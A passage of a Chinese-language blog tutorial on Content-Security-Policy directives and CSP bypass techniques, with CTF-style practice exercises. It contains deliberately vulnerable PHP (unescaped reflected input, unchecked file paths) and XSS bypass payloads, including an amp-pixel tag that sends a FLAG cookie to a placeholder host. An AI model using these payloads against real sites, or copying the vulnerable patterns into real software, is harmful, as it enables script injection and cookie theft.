+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2726c7f26c<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+  <span class="token keyword">var</span> inline <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
+<ul>
+<li>hash</li>
+</ul>
+<p>使用 Google 搜索如何生成 SHA 哈希值，将会返回任何语言的解决方法。 使用 Chrome 40 或更高版本，您可以打开 DevTools，然后重新加载您的页面。 Console 标签将包含错误消息，提供每个内联脚本的正确的 sha256 哈希值。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: script-src 'sha256-B2yPHKaXnvFWtRChIbabYmUBFZdVfKKXHbWtWidDVF8='"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+<span class="token comment" spellcheck="true">// 从内联脚本创建哈希。CSP支持sha256，sha384和sha512</span>
+<span class="token comment" spellcheck="true">// 生成哈希时，不要包含</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>标记，并注意大写和空白很重要，包括前导或尾随空格
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token keyword">var</span> inline <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
+<h5 id="unsafe-eval"><a href="#unsafe-eval" class="headerlink" title="unsafe-eval"></a>unsafe-eval</h5><p>‘unsafe-eval’源表达控制该创建从串代码几个脚本执行方法，未设置情况下以下方法将被阻止：</p>
+<ul>
+<li>eval()</li>
+<li>Function()</li>
+<li>传递字符串文字时，如： window.setTimeout(“alert(&quot;Hello World!&quot;);”, 500);<ul>
+<li>window.setTimeout</li>
+<li>window.setInterval</li>
+<li>window.setImmediate</li>
+<li>window.execScript（仅IE &lt;11）</li>
+</ul>
+</li>
+</ul>
+<h5 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h5><p>源表达式指定显式给予标记中存在的脚本的信任，通过附加一个随机数或散列值，应该传播给由该脚本加载的所有脚本。与此同时，任何白名单或源表达式（例如’self’或’unsafe-inline’将被忽略）</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: script-src 'nonce-DhcnhD3khTMePgXwdayK9BsMqXjhguV' 'strict-dynamic'"</span><span class="token punctuation">)</span><span class="token delimiter">?></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://blog.sari3l.com/script.js<span class="token punctuation">"</span></span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>DhcnhD3khTMePgXwdayK9BsMqXjhguVV<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span></code></pre>
+<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 以下 script 将被执行</span>
+<span class="token keyword">var</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+s<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'https://othercdn.not-example.net/dependency.js'</span><span class="token punctuation">;</span>
+document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true">// 以下 script 不会执行</span>
+document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;scr'</span> <span class="token operator">+</span> <span class="token string">'ipt src="/sadness.js">&lt;/scr'</span> <span class="token operator">+</span> <span class="token string">'ipt>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>不执行的原因在于 chrome 禁止了 document.write 执行动态生成的 script 代码块</p>
+<blockquote>
+<p>dependency.js will load, as the script element created by createElement() is not <a href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted" target="_blank" rel="noopener">“parser-inserted”</a>.</p>
+<p>sadness.js will not load, however, as document.write() produces script elements which are <a href="https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted" target="_blank" rel="noopener">“parser-inserted”</a>.</p>
+</blockquote>
+<h4 id="style-src"><a href="#style-src" class="headerlink" title="style-src"></a>style-src</h4><p>限制层叠样式表文件源</p>
+<h4 id="webrtc-src"><a href="#webrtc-src" class="headerlink" title="webrtc-src"></a>webrtc-src</h4><p>指定WebRTC连接的合法源地址</p>
+<h4 id="worker-src"><a href="#worker-src" class="headerlink" title="worker-src"></a>worker-src</h4><p>限制Worker、SharedWorker或者ServiceWorker脚本源</p>
+<h3 id="文档指令-Document-directives"><a href="#文档指令-Document-directives" class="headerlink" title="文档指令 Document directives"></a>文档指令 Document directives</h3><p>文档指令管理文档属性或者worker环境应用的策略</p>
+<h4 id="base-uri"><a href="#base-uri" class="headerlink" title="base-uri"></a>base-uri</h4><p>限制在DOM中&#60;base&gt;元素可以使用的URL</p>
+<p>base-uri 指令限制了可以应用于一个文档的 <base> 元素的 URL。假如指令值为空，那么任何 URL 都是允许的。如果指令不存在，那么用户代理会使用 &#60;base&gt; 元素中的值</p>
+<h4 id="plugin-types"><a href="#plugin-types" class="headerlink" title="plugin-types"></a>plugin-types</h4><p>通过限制可以加载的资源类型来限制哪些插件可以被嵌入到文档中</p>
+<h4 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h4><p>类似&#60;iframe&gt; sandbox属性，为请求的资源启用沙盒</p>
+<p>该指令与我们看到的其他指令有些不同，因为它限制的是页面可进行的操作，而不是页面可加载的资源。如果 sandbox 指令存在，则将此页面视为使用 sandbox 属性在 &#60;iframe&gt; 的内部加载的。这可能会对该页面产生广泛的影响：强制该页面进入一个唯一的来源，同时阻止表单提交等其他操作</p>
+<ul>
+<li><code>allow-forms</code>：允许嵌入式浏览上下文提交表单。如果未使用此关键字，则不允许此操作</li>
+<li><code>allow-modals</code>：允许嵌入式浏览上下文打开模态窗口</li>
+<li><code>allow-orientation-lock</code>：允许嵌入式浏览上下文禁用锁定屏幕方向的功能</li>
+<li><code>allow-pointer-lock</code>：允许嵌入式浏览上下文使用指针锁定API</li>
+<li><strong><code>allow-popups</code></strong>：允许弹出窗口（像window.open，target=”_blank”，showModalDialog）。如果未使用此关键字，则该功能将悄然失败</li>
+<li><code>allow-popups-to-escape-sandbox</code>：允许沙盒文档打开新窗口而不强制沙盒标记。例如，这将允许第三方广告安全地进行沙盒处理，而不会对登录页面强加相同的限制</li>
+<li><code>allow-presentation</code>：允许嵌入程序控制iframe是否可以启动演示会话</li>
+<li><code>allow-same-origin</code>：允许将内容视为来自其正常来源。如果未使用此关键字，则将嵌入内容视为来自唯一来源</li>
+<li><code>allow-scripts</code>：允许嵌入式浏览上下文运行脚本（但不能创建弹出窗口）。如果未使用此关键字，则不允许此操作</li>
+<li><code>allow-top-navigation</code>：允许嵌入式浏览上下文将内容导航（加载）到顶层浏览上下文。如果未使用此关键字，则不允许此操作</li>
+</ul>
+<h3 id="导航指令-Navigation-directives"><a href="#导航指令-Navigation-directives" class="headerlink" title="导航指令 Navigation directives"></a>导航指令 Navigation directives</h3><p>导航指令管理用户能打开的链接或者表单可提交的链接</p>
+<h4 id="form-action"><a href="#form-action" class="headerlink" title="form-action"></a>form-action</h4><p>限制能被用来作为给定上下文的表单提交的 目标 URL  （说白了，就是限制 form 的 action 属性的链接地址）</p>
+<h4 id="frame-ancestors"><a href="#frame-ancestors" class="headerlink" title="frame-ancestors"></a>frame-ancestors</h4><p>指定可能嵌入页面的有效父项&#60;frame&gt;, &#60;iframe&gt;, &#60;object&gt;, &#60;embed&gt;, or &#60;applet&gt;</p>
+<h4 id="navigation-to"><a href="#navigation-to" class="headerlink" title="navigation-to"></a>navigation-to</h4><p>限制文档可以通过以下任何方式访问URL (a, form, window.location, window.open, etc.)</p>
+<h3 id="报告指令-amp-其他指令"><a href="#报告指令-amp-其他指令" class="headerlink" title="报告指令 &amp; 其他指令"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy__by_cnvoid#%E6%8A%A5%E5%91%8A%E6%8C%87%E4%BB%A4" target="_blank" rel="noopener">报告指令</a> &amp; <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy__by_cnvoid#%E5%85%B6%E4%BB%96%E6%8C%87%E4%BB%A4_Other_directives" target="_blank" rel="noopener">其他指令</a></h3><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="Demo-1-iframe-CSP-attribute"><a href="#Demo-1-iframe-CSP-attribute" class="headerlink" title="Demo 1 - iframe CSP attribute"></a>Demo 1 - iframe CSP attribute</h3><p>如果设置iframe元素的csp属性，会对<strong>内嵌的资源强制实行同源策略</strong>，来源<a href="https://w3c.github.io/webappsec-cspee/#csp-attribute" target="_blank" rel="noopener">w3c</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15659394875438.jpg" alt="-w826"></p>
+<p><strong>需要注意一点：</strong><br><strong>1. 强制覆盖只应用于被 src 属性引入的页面</strong><br><strong>2. 如果是利用 srcdoc 属性嵌入的 html 中使用 meta 限定了 CSP，实际和 iframe 的 csp 属性采用并列形式</strong></p>
+<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- 查看console报错信息，需同时满足两个nonce --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">csp</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script-src <span class="token punctuation">'</span>nonce-1<span class="token punctuation">'</span><span class="token punctuation">"</span></span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>&amp;#60;&amp;#109;&amp;#101;&amp;#116;&amp;#97;&amp;#32;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#45;&amp;#101;&amp;#113;&amp;#117;&amp;#105;&amp;#118;&amp;#61;&amp;#39;&amp;#67;&amp;#111;&amp;#110;&amp;#116;&amp;#101;&amp;#110;&amp;#116;&amp;#45;&amp;#83;&amp;#101;&amp;#99;&amp;#117;&amp;#114;&amp;#105;&amp;#116;&amp;#121;&amp;#45;&amp;#80;&amp;#111;&amp;#108;&amp;#105;&amp;#99;&amp;#121;&amp;#39;&amp;#32;&amp;#99;&amp;#111;&amp;#110;&amp;#116;&amp;#101;&amp;#110;&amp;#116;&amp;#61;&amp;#34;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#45;&amp;#115;&amp;#114;&amp;#99;&amp;#32;&amp;#39;&amp;#110;&amp;#111;&amp;#110;&amp;#99;&amp;#101;&amp;#45;&amp;#50;&amp;#39;&amp;#34;&amp;#62;&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#110;&amp;#111;&amp;#110;&amp;#99;&amp;#101;&amp;#61;&amp;#50;&amp;#62;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+
+<span class="token comment" spellcheck="true">&lt;!-- 编码内容 --></span>
+<span class="token comment" spellcheck="true">&lt;!-- &lt;meta http-equiv='Content-Security-Policy' content="script-src 'nonce-2'">&lt;script nonce=2>alert(1)&lt;/script> --></span></code></pre>
+<h4 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// demo.php</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">randHash</span><span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">openssl_random_pseudo_bytes</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token string">"&lt;script src='csp.php?nonce="</span> <span class="token punctuation">.</span> <span class="token function">randHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"'>&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+Update Profile<span class="token punctuation">:</span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>update.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>profile<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> 
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">echo</span> <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string">"/tmp/"</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">".txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+            <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:/demo.php?id="</span> <span class="token punctuation">.</span> <span class="token function">randHash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>
+    <span class="token markup">&lt;input type="hidden" name="id" value="<span class="token prolog">&lt;?php echo $_GET['id'];?></span></span>"<span class="token operator">></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
+
+<span class="token comment" spellcheck="true">//csp.php</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type: text/javascript'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+meta <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'meta'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+meta<span class="token punctuation">.</span>httpEquiv <span class="token operator">=</span> <span class="token string">'Content-Security-Policy'</span><span class="token punctuation">;</span>
+meta<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token string">"script-src 'nonce-&lt;?php echo $_GET[nonce];?>'"</span><span class="token punctuation">;</span>
+document<span class="token punctuation">.</span>head<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>meta<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true">//update.php</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token keyword">try</span> <span class="token punctuation">{</span>
+    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'profile'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$tmpfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/tmp/"</span> <span class="token punctuation">.</span> <span class="token variable">$id</span> <span class="token punctuation">.</span> <span class="token string">".txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$tmpfile</span><span class="token punctuation">,</span> <span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string">'success'</span><span class="token punctuation">;</span>
+    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"location:/demo.php?id="</span> <span class="token punctuation">.</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">catch</span><span class="token punctuation">(</span>Exception <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'Message: '</span> <span class="token punctuation">.</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>利用</p>
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>iframe.php?id<span class="token punctuation">=</span>当前页面ID值<span class="token punctuation">"</span></span> <span class="token attr-name">csp</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script-src <span class="token punctuation">'</span>nonce-1<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">nonce</span><span class="token attr-value"><span class="token punctuation">=</span>1</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>
+<hr>
+<p>额外利用方式，利用<code>chrome-xss-auditor</code>屏蔽添加csp的js代码执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15663520902041.jpg" alt="-w1017"></p>
+<h3 id="Demo-2-base-uri"><a href="#Demo-2-base-uri" class="headerlink" title="Demo 2 - base-uri"></a>Demo 2 - base-uri</h3><p>条件：</p>
+<ol>
+<li>script-src 出现<code>nonce</code>，不允许出现<code>self</code>或者限定有某<code>ip\domain</code></li>
+<li>没有设置有额外的 base-uri 或被 default-src 设置的 base-uri</li>
+<li>script 标签中可控的nonce，以及src采用相对路径</li>
+</ol>
+<h4 id="练习题-1"><a href="#练习题-1" class="headerlink" title="练习题"></a>练习题</h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">// demo.php</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy: default-src 'self'; script-src 'nonce-test'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^\/\/([-.\w]*[0-9a-zA-Z])\//'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'blog.sari3l.com'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+        <span class="token keyword">echo</span> <span class="token string">"&lt;base href='"</span> <span class="token punctuation">.</span> <span class="token variable">$base</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"'>"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demo.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>GET<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>textarea</span> <span class="token attr-name">rows</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">cols</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>profile<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'profile'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'profile'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'profile'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>textarea</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span></code></pre>
+<p>利用</p>
+<pre class=" language-plain"><code class="language-plain">?base=//blog.sari3l.com.IPS/&profile=</textarea><script nonce="test" src='1.js'></script></code></pre>
+<h3 id="Demo-3-CDN"><a href="#Demo-3-CDN" class="headerlink" title="Demo 3 - CDN"></a>Demo 3 - CDN</h3><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险</p>
+<ul>
+<li>案例：<a href="https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html" target="_blank" rel="noopener">orange - A Wormable XSS on HackMD!</a></li>
+<li>可用cdn - 低版本angular模板注入：<a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">csp-evaluator</a></li>
+<li>RCTF2018：AMP库</li>
+</ul>
+<pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- 下面的标签可以获取名字为FLAG的cookie --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>amp-pixel</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://IPS/?cid<span class="token punctuation">=</span>CLIENT_ID(FLAG)<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>amp-pixel</span><span class="token punctuation">></span></span></code></pre>
+<ul>
+<li>BlackHat - 更多可用JS库整理：<a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">PDF</a></li>
+</ul>
+<p>条件：</p>
+<ol>
+<li>script-src CDN 白名单</li>
+<li>库文件存在低版本 XSS 漏洞</li>
+<li>具体条件如下<br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15661965585420.jpg" alt="-w915"><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/66ad34dc/2019-08-23-15661965923643.jpg" alt="-w196"></li>
+</ol>
+<h4 id="练习题-2"><a href="#练习题-2" class="headerlink" title="练习题"></a>练习题</h4><pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//demo.php</span>
+<span class="token delimiter">&lt;?php</span>
+<span class="token function">header</span><span class="token punctuation">(</span>"Content<span class="token operator">-</span>Security<span class="token operator">-</span>Policy<span class="token punctuation">:</span> script<span class="token operator">-</span>src <span class="token string">'unsafe-eval'</span> https<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//cdnjs.cloudflare.com; default-src 'none'");</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">"&lt;script src='"</span> <span class="token punctuation">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'src'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"'>&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'profile'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'profile'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token delimiter">?></span></code></pre>
+<p>利用</p>
